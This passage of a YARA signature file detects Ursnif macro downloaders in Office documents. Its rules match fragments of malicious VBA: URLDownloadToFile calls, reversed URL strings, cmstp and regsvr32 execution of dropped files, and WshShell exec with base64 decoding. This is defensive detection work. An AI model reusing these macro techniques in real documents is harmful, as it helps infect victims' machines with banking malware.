        $x_1_4 = {53 65 74 20 [0-15] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 63 72 69 70 74 69 6e 67 2e 46 69 6c 65 53 79 73 74 65 6d 4f 62 6a 65 63 74 22 29 [0-95] 44 69 6d 20 [0-15] 20 41 73 20 4f 62 6a 65 63 74 00 04 53 65 74 20 02 20 3d 20 00 2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-15] 2c 20 54 72 75 65 2c 20 54 72 75 65 29 [0-10] 02 2e 57 72 69 74 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AT_2147745775_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AT!MTB"
        threat_id = "2147745775"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Chr(115 + 0) + \"HELL.\"" ascii //weight: 1
        $x_1_2 = {2e 43 6f 6e 74 72 6f 6c 73 28 [0-85] 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_3 = {4f 70 65 6e 20 54 72 69 6d 28 [0-85] 29 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_4 = {50 72 69 6e 74 20 23 ?? 2c 20 54 72 69 6d 28}  //weight: 1, accuracy: Low
        $x_1_5 = "Close #" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AU_2147746204_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AU!MTB"
        threat_id = "2147746204"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-16] 20 26 20 [0-16] 20 26 20 [0-16] 20 26 20 22 70 22 20 26 20 22 5c 22 20 26 20 22 5c [0-8] 2e 78 73 6c 22 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_2 = {43 61 6c 6c 20 49 6e 74 65 72 61 63 74 69 6f 6e 2e 53 68 65 6c 6c 40 28 [0-8] 2c 20 32 29}  //weight: 1, accuracy: Low
        $x_1_3 = "ActiveDocument.ActiveWindow.Panes(1).Pages.Count" ascii //weight: 1
        $x_1_4 = ".Text" ascii //weight: 1
        $x_1_5 = "= \"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AV_2147746223_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AV!MTB"
        threat_id = "2147746223"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "13"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = "= StrReverse(\"\\\\\\\\pmet\\\\\\\\swodniw\\\\\\\\:c\")" ascii //weight: 10
        $x_1_2 = {2e 69 6e 66 22 2c 20 [0-9] 2e 76 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 73 63 74 22 2c 20 [0-9] 2e 76 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_4 = {53 6c 65 65 70 20 05 00}  //weight: 1, accuracy: Low
        $x_2_5 = {53 74 72 52 65 76 65 72 73 65 28 22 20 73 2f 20 69 6e 2f 20 70 74 73 6d 63 22 29 20 26 20 [0-9] 20 26 20 22 [0-15] 2e 69 6e 66 22}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 3 of ($x_1_*))) or
            ((1 of ($x_10_*) and 1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Ursnif_AV_2147746223_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AV!MTB"
        threat_id = "2147746223"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Chr(115 + 0) + \"HELL.\"" ascii //weight: 1
        $x_1_2 = ".Controls" ascii //weight: 1
        $x_1_3 = {2e 56 61 6c 75 65 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_4 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29}  //weight: 1, accuracy: Low
        $x_1_5 = {4f 70 65 6e 20 54 72 69 6d 28 [0-85] 29 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_6 = {50 72 69 6e 74 20 23 ?? 2c 20 54 72 69 6d 28}  //weight: 1, accuracy: Low
        $x_1_7 = "Close #" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AW_2147748002_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AW!MTB"
        threat_id = "2147748002"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".createElement(\"b64\")" ascii //weight: 1
        $x_1_2 = "= \"bin.base64\"" ascii //weight: 1
        $x_1_3 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-8] 20 26 20 [0-8] 20 26 20 [0-8] 20 26 20 22 70 22 20 26 20 22 5c 22 20 26 20 22 5c [0-8] 2e 78 73 6c 22 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_4 = {43 61 6c 6c 20 49 6e 74 65 72 61 63 74 69 6f 6e 24 2e 53 68 65 6c 6c 40 28 53 74 72 52 65 76 65 72 73 65 28 [0-8] 29 2c 20 30 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AX_2147748041_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AX!MTB"
        threat_id = "2147748041"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".createElement(\"b64\")" ascii //weight: 1
        $x_1_2 = "= \"bin.base64\"" ascii //weight: 1
        $x_1_3 = {26 20 22 65 6d 70 22 20 26 20 22 5c [0-8] 2e 78 73 6c 22 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_4 = {43 61 6c 6c 20 56 42 41 2e 53 68 65 6c 6c 40 28 53 74 72 52 65 76 65 72 73 65 28 [0-8] 29 29}  //weight: 1, accuracy: Low
        $x_1_5 = {43 61 6c 6c 20 56 42 41 2e 49 6e 74 65 72 61 63 74 69 6f 6e 2e 53 68 65 6c 6c 40 28 53 74 72 52 65 76 65 72 73 65 28 [0-8] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AY_2147748508_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AY!MTB"
        threat_id = "2147748508"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".createElement(\"b64\")" ascii //weight: 1
        $x_1_2 = "= \"bin.base64\"" ascii //weight: 1
        $x_1_3 = {4f 70 65 6e 20 [0-8] 20 2b 20 [0-8] 20 2b 20 22 [0-5] 5c [0-8] 2e 78 73 6c 22 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_4 = {43 61 6c 6c 20 56 42 41 2e 49 6e 74 65 72 61 63 74 69 6f 6e 2e 53 68 65 6c 6c 40 28 53 74 72 52 65 76 65 72 73 65 28 [0-8] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AZ_2147749500_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AZ!MTB"
        threat_id = "2147749500"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4f 70 65 6e 20 [0-48] 5c [0-32] 2e 78 73 6c 22}  //weight: 1, accuracy: Low
        $x_1_2 = {4f 70 65 6e 20 [0-48] 5c [0-32] 2e 78 22 20 2b 20 [0-32] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_3 = {50 72 69 6e 74 20 23 [0-2] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = "Debug.Print Error" ascii //weight: 1
        $x_1_5 = {2e 72 75 6e 20 53 74 72 52 65 76 65 72 73 65 28 [0-32] 28 [0-32] 2c}  //weight: 1, accuracy: Low
        $x_1_6 = "= \"\"" ascii //weight: 1
        $x_1_7 = "= New WshShell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BA_2147749536_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BA!MTB"
        threat_id = "2147749536"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4f 70 65 6e 20 [0-48] 5c [0-32] 2e 78 73 22 20 2b 20 [0-32] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_2 = {50 75 62 6c 69 63 20 43 6f 6e 73 74 20 [0-16] 20 41 73 20 53 74 72 69 6e 67 20 3d 20 22 63 3a 5c 77 69 6e 64 6f 77 73 22 02 00 50 75 62 6c 69 63 20 43 6f 6e 73 74 20 [0-16] 20 41 73 20 53 74 72 69 6e 67 20 3d 20 22 5c 74 22}  //weight: 1, accuracy: Low
        $x_1_3 = "Debug.Print Error" ascii //weight: 1
        $x_1_4 = "Call VBA.Shell@(StrReverse" ascii //weight: 1
        $x_1_5 = "= \"\"" ascii //weight: 1
        $x_1_6 = "= New WshShell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BB_2147749571_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BB!MTB"
        threat_id = "2147749571"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 72 69 6e 74 20 23 [0-1] 2c 20 [0-16] 2e 78 2e 76 61 6c 75 65 20 26 20 [0-16] 2e 79 2e 76 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_2 = "= \"aubex.x\" +" ascii //weight: 1
        $x_1_3 = "= \"sl\"" ascii //weight: 1
        $x_1_4 = {44 65 62 75 67 2e 50 72 69 6e 74 20 45 72 72 6f 72 28 [0-16] 29 02 00 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 22 22 02 00 44 69 6d 20 [0-16] 20 41 73 20 49 6e 74 65 67 65 72 02 00 44 69 6d 20 [0-16] 20 41 73 20 4c 6f 6e 67}  //weight: 1, accuracy: Low
        $x_1_6 = "= New WshShell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BC_2147749655_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BC!MTB"
        threat_id = "2147749655"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".createElement(\"b64\")" ascii //weight: 1
        $x_1_2 = "\"bin.base64\"" ascii //weight: 1
        $x_1_3 = "Debug.Print Error" ascii //weight: 1
        $x_1_4 = {50 75 62 6c 69 63 20 43 6f 6e 73 74 20 [0-16] 20 41 73 20 53 74 72 69 6e 67 20 3d 20 22 6c 73 78 22 02 00 50 75 62 6c 69 63 20 43 6f 6e 73 74 20 [0-16] 20 41 73 20 4c 6f 6e 67 20 3d 20 30 02 00 46 75 6e 63 74 69 6f 6e 20 61 6d 48 6a 39 32 28 [0-16] 29 02 00 44 69 6d}  //weight: 1, accuracy: Low
        $x_1_5 = "= \"\"" ascii //weight: 1
        $x_1_6 = "= New WshShell" ascii //weight: 1
        $x_1_7 = {50 72 69 6e 74 20 23 [0-1] 2c}  //weight: 1, accuracy: Low
        $x_1_8 = {43 61 6c 6c 20 [0-16] 2e 65 78 65 63 28 53 74 72 52 65 76 65 72 73 65 28 [0-16] 28 41 72 72 61 79 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BD_2147749695_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BD!MTB"
        threat_id = "2147749695"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".createElement(\"b64\")" ascii //weight: 1
        $x_1_2 = "(\"46esab.nib\")" ascii //weight: 1
        $x_1_3 = "Debug.Print Error" ascii //weight: 1
        $x_1_4 = "= \"\"" ascii //weight: 1
        $x_1_5 = {74 65 6d 70 5c [0-16] 2e 78}  //weight: 1, accuracy: Low
        $x_1_6 = {56 42 41 2e 49 6e 74 65 72 61 63 74 69 6f 6e ?? 2e 53 68 65 6c 6c 40 20 [0-16] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BD_2147749695_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BD!MTB"
        threat_id = "2147749695"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4f 70 65 6e 20 22 [0-16] 2e 78 22 20 2b 20 [0-16] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_2 = ".createElement(\"b64\")" ascii //weight: 1
        $x_1_3 = "Debug.Print Error" ascii //weight: 1
        $x_1_4 = "= \"\"" ascii //weight: 1
        $x_1_5 = "= New WshShell" ascii //weight: 1
        $x_1_6 = {3d 20 53 74 72 52 65 76 65 72 73 65 28 [0-16] 29 02 00 43 61 6c 6c 20 [0-16] 2e 65 78 65 63 28 [0-16] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BE_2147750040_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BE!MTB"
        threat_id = "2147750040"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"lsx.\"" ascii //weight: 1
        $x_1_2 = {4f 70 65 6e 20 53 74 72 52 65 76 65 72 73 65 28 [0-16] 29 20 26 20 22 5c [0-16] 22 20 2b 20 53 74 72 52 65 76 65 72 73 65 28 [0-16] 29 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_3 = "Debug.Print Error" ascii //weight: 1
        $x_1_4 = "= \"\"" ascii //weight: 1
        $x_1_5 = "= New WshShell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BF_2147750758_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BF!MTB"
        threat_id = "2147750758"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 49 74 65 6d 28 29 2e 44 6f 63 75 6d 65 6e 74 2e 41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 [0-21] 2c 20 [0-32] 20 26 20 [0-21] 2c 20 [0-21] 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 4d 65 2e 49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-2] 29 2e 41 6c 74 65 72 6e 61 74 69 76 65 54 65 78 74 20 26 20 4d 65 2e 49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-2] 29 2e 41 6c 74 65 72 6e 61 74 69 76 65 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {26 20 53 70 6c 69 74 28 22 22 20 26 20 22 22 20 26 20 53 74 72 43 6f 6e 76 28 [0-32] 2c 20 [0-32] 29 2c 20 22 22 20 26 20 22 22 20 26}  //weight: 1, accuracy: Low
        $x_1_4 = "+ ThisDocument.Application.CentimetersToPoints" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BG_2147750936_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BG!MTB"
        threat_id = "2147750936"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "#If VBA7 Then" ascii //weight: 1
        $x_1_2 = "Public Declare PtrSafe Sub Sleep Lib \"kernel32\" (ByVal Milliseconds As LongPtr)" ascii //weight: 1
        $x_1_3 = {43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c [0-16] 2e 69 6e 66 22 2c 20 [0-16] 2e 76 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_4 = {43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c [0-16] 2e 73 63 74 22 2c 20 [0-16] 2e 76 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 53 68 65 6c 6c 28 22 63 6d 73 74 70 20 2f 6e 69 20 2f 73 20 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c [0-16] 2e 69 6e 66 22 29}  //weight: 1, accuracy: Low
        $x_1_6 = "Sleep 3000" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BH_2147753091_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BH!MTB"
        threat_id = "2147753091"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Environ(\"tmp\")" ascii //weight: 1
        $x_1_2 = {2e 52 75 6e 20 53 74 72 52 65 76 65 72 73 65 28 22 [0-21] 22 29 20 26 20 22 20 22 20 26 20 [0-21] 2c 20 77 69 6e 64 6f 77 53 74 79 6c 65 2c}  //weight: 1, accuracy: Low
        $x_1_3 = ".createElement(\"b64\")" ascii //weight: 1
        $x_1_4 = "= \"bin.base64\"" ascii //weight: 1
        $x_1_5 = ".text.text)" ascii //weight: 1
        $x_1_6 = {44 65 62 75 67 2e 50 72 69 6e 74 20 45 72 72 6f 72 28 [0-21] 29 02 00 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_A_2147753490_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.A!MSR"
        threat_id = "2147753490"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = "ExecuteCommand \"C:\\DiskDrive\\1\\Volume\\BackFiles\\errorfix.bat" ascii //weight: 5
        $x_1_2 = {2e 70 68 70 20 22 20 26 20 45 6e 76 69 72 6f 6e 28 22 61 70 70 64 61 74 61 22 29 20 26 20 [0-20] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_3 = {26 20 45 6e 76 69 72 6f 6e 28 22 61 70 70 64 61 74 61 22 29 20 26 20 [0-20] 2e 65 78 65 22 20 26 20 55 73 65 72 46 6f 72 6d 33 2e 52 6f 6f 74 4f 4c 45 32 2e 43 61 70 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Ursnif_BI_2147754227_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BI!MTB"
        threat_id = "2147754227"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4d 65 2e 49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-2] 29 2e 41 6c 74 65 72 6e 61 74 69 76 65 54 65 78 74 20 26 20 4d 65 2e 49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-2] 29 2e 41 6c 74 65 72 6e 61 74 69 76 65 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_2 = {26 20 53 70 6c 69 74 28 [0-21] 2c 20 [0-21] 29 28}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-1] 29 2e 41 6c 74 65 72 6e 61 74 69 76 65 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 [0-18] 20 3d 20 41 72 72 61 79 28 [0-8] 2c}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 22 22 [0-18] 20 3d 20 41 72 72 61 79 28}  //weight: 1, accuracy: Low
        $x_1_6 = {4e 65 78 74 20 [0-32] 20 3d 20 41 72 72 61 79 28}  //weight: 1, accuracy: Low
        $x_1_7 = "+ ThisDocument.Application.InchesToPoints(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BJ_2147754242_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BJ!MTB"
        threat_id = "2147754242"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Private Declare PtrSafe Function URLDownloadToFile Lib \"urlmon\" _" ascii //weight: 1
        $x_1_2 = "//:ptth\"," ascii //weight: 1
        $x_1_3 = {28 22 74 6d 70 22 29 20 26 20 22 5c [0-4] 2e 74 6d 70 22}  //weight: 1, accuracy: Low
        $x_1_4 = {43 61 6c 6c 20 [0-3] 2e [0-3] 28 22 72 65 67 73 76 72 33 32 20 22 20 2b}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 28 30 26 2c 20 53 74 72 52 65 76 65 72 73 65 28 [0-2] 29 2c 20 [0-2] 2c 20 [0-2] 26 2c 20 [0-2] 26 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_6 = {44 69 6d 20 [0-3] 20 41 73 20 4e 65 77 20 57 73 68 53 68 65 6c 6c [0-5] 2e 65 78 65 63}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BK_2147755601_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BK!MTB"
        threat_id = "2147755601"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 72 69 76 61 74 65 20 44 65 63 6c 61 72 65 20 46 75 6e 63 74 69 6f 6e 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 4c 69 62 20 22 75 72 6c 6d 6f 6e 22 20 5f 02 00 41 6c 69 61 73 20 22 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 22 20 28 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 28 30 26 2c 20 [0-2] 2c 20 [0-2] 2c 20 30 26 2c 20 30 26 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {44 69 6d 20 [0-2] 20 41 73 20 4e 65 77 20 57 73 68 53 68 65 6c 6c [0-6] 2e 65 78 65 63}  //weight: 1, accuracy: Low
